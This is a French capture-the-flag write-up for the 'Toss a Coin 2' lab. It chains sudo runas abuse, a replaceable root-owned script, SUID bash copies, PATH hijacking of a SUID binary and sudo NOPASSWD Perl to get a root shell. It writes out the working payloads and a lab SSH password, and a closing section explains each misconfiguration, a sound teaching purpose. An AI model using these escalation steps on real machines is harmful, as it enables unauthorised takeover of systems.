# Toss a Coin 2 — root.txt

## 1. Flag

```text
EPI{********}
```

## 2. Objectif

L'objectif de ce challenge est d'effectuer une chaîne d'escalade de privilèges depuis l'utilisateur `jaskier` jusqu'à `root`.

Le challenge repose sur plusieurs mécanismes successifs :

```text
jaskier
  ↓
yen
  ↓
geralt
  ↓
root
```

Chaque étape exploite une mauvaise configuration différente.

---

## 3. Techniques utilisées

* Énumération des privilèges `sudo`
* Abus de `sudo` avec changement d'utilisateur (`runas`)
* Remplacement d'un script Python appartenant à `root`
* Création d'un binaire Bash SUID
* Exploitation d'un binaire SUID
* PATH hijacking
* Analyse statique d'un binaire C
* Manipulation de `PATH`
* Manipulation des UID avec `setresuid`
* Énumération des règles `sudo`
* Exploitation d'un `sudo NOPASSWD`
* Exécution de commandes via Perl

---

## 4. Outils utilisés

* `ssh`
* `sudo`
* Python 3
* Bash
* `find`
* `ls`
* `file`
* Analyse du binaire `portal`
* `cat`
* `chmod`
* `cp`
* `setresuid`
* Perl

---

## 5. Point de départ : accès `jaskier`

L'accès SSH obtenu dans **Toss a Coin #1** permet de commencer l'exploitation avec l'utilisateur :

```text
jaskier
```

Les identifiants utilisés sont :

```text
Utilisateur : jaskier
Mot de passe : YouHaveTheMostIncredibleNeckItsLikeASexyGoose
```

On dispose donc initialement d'un shell avec les privilèges de `jaskier`.

---

## 6. Énumération des privilèges sudo

La première étape consiste à vérifier les commandes que `jaskier` peut exécuter avec `sudo`.

La commande utilisée est :

```bash
echo 'YouHaveTheMostIncredibleNeckItsLikeASexyGoose' | sudo -S -l
```

Le résultat indique :

```text
User jaskier may run (yen) /usr/bin/python3 /home/jaskier/toss-a-coin.py
```

Cette règle signifie que `jaskier` peut exécuter :

```text
/usr/bin/python3 /home/jaskier/toss-a-coin.py
```

avec l'identité de l'utilisateur :

```text
yen
```

Le mécanisme `runas` de `sudo` constitue donc le premier vecteur d'escalade.

---

## 7. Analyse de `toss-a-coin.py`

Le script :

```text
/home/jaskier/toss-a-coin.py
```

appartient à `root`.

Cependant, il se trouve dans le répertoire personnel de `jaskier`, dont celui-ci est propriétaire.

Cela permet à `jaskier` de remplacer le fichier par un script de son choix.

La situation est donc :

```text
root
  └── /home/jaskier/toss-a-coin.py
          ↑
      modifiable par jaskier
```

Il est ainsi possible de faire exécuter du code arbitraire avec l'identité `yen` grâce à la règle `sudo`.

---

## 8. Remplacement du script

Le script est remplacé par un payload Python permettant de créer un shell Bash SUID.

Le payload utilisé est :

```python
import os

os.system("cp /bin/bash /tmp/yenbash; chmod 4755 /tmp/yenbash")
```

Le fonctionnement est le suivant :

1. Copier `/bin/bash` vers `/tmp/yenbash`.
2. Modifier les permissions du nouveau fichier.
3. Ajouter le bit SUID.

Le fichier obtenu appartient alors à l'utilisateur sous lequel le script est exécuté, ici `yen`.

---

## 9. Exécution avec l'identité `yen`

Le script modifié est exécuté via :

```bash
sudo -u yen python3 /home/jaskier/toss-a-coin.py
```

Cela crée :

```text
/tmp/yenbash
```

avec le bit SUID et l'utilisateur propriétaire :

```text
yen
```

Le shell peut alors être lancé avec :

```bash
/tmp/yenbash -p
```

L'option `-p` permet à Bash de conserver les privilèges effectifs.

On obtient ainsi un shell avec l'identité :

```text
yen
```

La première étape d'escalade est donc terminée :

```text
jaskier
   ↓
sudo -u yen
   ↓
yen
```

---

## 10. Découverte du binaire `portal`

Une énumération du répertoire personnel de `yen` révèle un binaire intéressant :

```text
/home/yen/portal
```

Le fichier est un binaire C possédant le bit SUID.

L'analyse du programme permet de déterminer qu'il utilise notamment :

```text
system()
```

pour exécuter la commande :

```text
date
```

sans utiliser son chemin absolu.

Cette situation rend le programme vulnérable à un **PATH hijacking**.

---

## 11. Analyse du changement d'identité

L'analyse du code de `portal` révèle également que le programme utilise `setuid()` / `setgid()`.

Le programme change explicitement son identité avant d'effectuer l'appel vulnérable.

L'identité ciblée est :

```text
geralt
```

Cela correspond à la mécanique prévue par le challenge : le portail prépare un accès pour Geralt.

La chaîne devient donc :

```text
yen
  ↓
/home/yen/portal
  ↓
setuid/setgid
  ↓
geralt
  ↓
system("date")
```

Le point exploitable est l'absence de chemin absolu pour `date`.

---

## 12. Exploitation du PATH hijacking

Un faux exécutable `date` est créé dans un répertoire contrôlé par l'utilisateur :

```bash
mkdir /tmp/evil
```

Puis un script est créé :

```bash
cat > /tmp/evil/date << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
```

Le script est rendu exécutable :

```bash
chmod +x /tmp/evil/date
```

Le `PATH` est ensuite modifié afin que `/tmp/evil` soit recherché avant les répertoires système :

```bash
PATH=/tmp/evil:$PATH /home/yen/portal
```

Lorsque `portal` exécute :

```text
date
```

le système trouve notre faux binaire :

```text
/tmp/evil/date
```

au lieu du véritable :

```text
/usr/bin/date
```

---

## 13. Création du shell SUID `geralt`

Le faux `date` exécute :

```bash
cp /bin/bash /tmp/rootbash
chmod 4777 /tmp/rootbash
```

Le fichier `/tmp/rootbash` est alors créé sous l'identité `geralt`.

Il possède le bit SUID.

La chaîne devient :

```text
yen
  ↓
portal
  ↓
system("date")
  ↓
/tmp/evil/date
  ↓
/tmp/rootbash
  ↓
geralt
```

---

## 14. Passage à l'identité `geralt`

Le shell `/tmp/rootbash` possède l'euid correspondant à `geralt`.

Il est alors possible de manipuler les UID du processus avec Python.

La commande utilisée est :

```python
import os
os.setresuid(1003,1003,1003)
```

L'UID `1003` correspond à `geralt`.

Cette opération est possible car `1003` était déjà présent comme euid/saved UID du processus.

On obtient alors complètement l'identité :

```text
geralt
```

---

## 15. Nouvelle énumération sudo

Une fois sous l'identité `geralt`, les privilèges `sudo` sont de nouveau vérifiés :

```bash
sudo -n -l
```

Une nouvelle règle intéressante apparaît :

```text
(root) NOPASSWD: /usr/bin/perl
```

Cela signifie que `geralt` peut exécuter `/usr/bin/perl` en tant que `root` sans fournir de mot de passe.

---

## 16. Escalade finale avec Perl

Perl permet d'exécuter directement une commande système.

La commande suivante est utilisée :

```bash
sudo /usr/bin/perl -e 'exec "/bin/bash";'
```

`perl` est alors exécuté avec les privilèges `root` et lance :

```text
/bin/bash
```

On obtient finalement un shell root.

La chaîne complète devient :

```text
jaskier
  ↓
sudo -u yen
  ↓
yen
  ↓
SUID portal
  ↓
PATH hijacking
  ↓
geralt
  ↓
sudo NOPASSWD perl
  ↓
root
```

---

## 17. Récupération du flag

Une fois le shell root obtenu, le fichier :

```text
/root/root.txt
```

peut être lu avec :

```bash
cat /root/root.txt
```

Le flag récupéré est :

```text
EPI{********}
```

---

## 18. Vulnérabilités identifiées

### 18.1 Sudo avec changement d'utilisateur

La règle :

```text
jaskier → yen
```

autorise l'exécution d'un script Python avec l'identité `yen`.

Cela permet de changer de contexte utilisateur sans connaître le mot de passe de `yen`.

### 18.2 Script privilégié modifiable

Le fichier :

```text
/home/jaskier/toss-a-coin.py
```

appartient à `root` mais se trouve dans un répertoire contrôlé par `jaskier`.

Cette combinaison permet à `jaskier` de modifier le code qui sera ensuite exécuté via `sudo`.

### 18.3 Binaire SUID vulnérable au PATH hijacking

Le programme :

```text
/home/yen/portal
```

exécute :

```text
system("date")
```

sans chemin absolu.

Un utilisateur capable de contrôler `PATH` peut donc substituer sa propre commande `date`.

### 18.4 Sudo NOPASSWD sur Perl

L'utilisateur `geralt` dispose finalement de :

```text
(root) NOPASSWD: /usr/bin/perl
```

Perl permettant d'exécuter des commandes arbitraires, cette règle donne un moyen direct d'obtenir un shell root.

---

## 19. Chaîne d'exploitation complète

```text
Accès SSH
    ↓
jaskier
    ↓
sudo -l
    ↓
sudo -u yen python3 toss-a-coin.py
    ↓
toss-a-coin.py modifiable
    ↓
Création de /tmp/yenbash SUID
    ↓
yen
    ↓
/home/yen/portal
    ↓
SUID
    ↓
system("date")
    ↓
PATH hijacking
    ↓
/tmp/evil/date
    ↓
Création de /tmp/rootbash SUID
    ↓
geralt
    ↓
setresuid(1003,1003,1003)
    ↓
sudo -n -l
    ↓
NOPASSWD: /usr/bin/perl
    ↓
sudo perl -e 'exec "/bin/bash";'
    ↓
root
    ↓
/root/root.txt
    ↓
EPI{********}
```

---

## 20. Résumé

Le challenge **Toss a Coin 2** repose sur une chaîne d'escalade en plusieurs étapes, chacune permettant de passer au personnage suivant de l'univers de *The Witcher*.

On commence avec `jaskier`, qui possède une règle `sudo` permettant d'exécuter `toss-a-coin.py` avec l'identité `yen`.

Le script appartenant à `root` se trouve dans un répertoire contrôlé par `jaskier` et peut donc être remplacé. Un payload Python crée alors un Bash SUID appartenant à `yen`, permettant de passer sous cette identité.

Depuis `yen`, le binaire SUID `/home/yen/portal` est découvert. Son utilisation de `system("date")` sans chemin absolu permet un **PATH hijacking**. Un faux `date` crée un Bash SUID appartenant à `geralt`.

Après avoir obtenu l'identité `geralt`, l'énumération `sudo` révèle une règle :

```text
(root) NOPASSWD: /usr/bin/perl
```

Perl est alors utilisé pour lancer `/bin/bash` avec les privilèges root.

La chaîne finale est donc :

```text
jaskier → yen → geralt → root
```

Le flag final est :

```text
EPI{********}
```
